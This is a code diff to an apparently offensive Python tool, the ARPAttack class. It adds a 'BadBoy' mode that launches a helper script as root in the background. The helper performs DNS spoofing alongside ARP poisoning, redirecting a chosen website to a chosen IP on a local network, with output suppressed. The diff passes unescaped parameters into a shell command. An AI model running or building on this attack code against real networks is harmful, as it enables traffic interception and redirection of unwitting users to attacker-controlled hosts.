@@ -42,7 +42,7 @@ class ARPAttack:
         self.__dt_format = "%H:%M:%S"
         self.report_file = report_file
 
-    def start_arp(self, location, which_boy):
+    def start_arp(self, location, which_boy, bad_boy):
 
         packets_count = 0
         time_in_min = random(5, 11)
@@ -66,6 +66,25 @@ class ARPAttack:
                             stderr=subprocess.DEVNULL,
                             stdout=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL)
+
+        elif which_boy == 'B':
+
+            print("[+] Initializing BadBoy Program.")
+            self.report_file.write("\n[{0}] Initializing BoyBoy Program."
+                                   .format(datetime.now().strftime(self.__dt_format)))
+
+            subprocess.call("sudo python3 support_files/bad_boy.py -q {0} -dw {1} -da {2} -tf {3} -address {4} &"
+                            .format(bad_boy['queue_num'],
+                                    bad_boy['dns_website_to_spoof'],
+                                    bad_boy['dns_ip_spoof_to'],
+                                    location,
+                                    time_in_min * 60),
+                            shell=True,
+                            stderr=subprocess.DEVNULL,
+                            stdout=subprocess.DEVNULL,
+                            stdin=subprocess.DEVNULL)
+
+            time.sleep(5)
 
         while time.time() <= end_time:
 
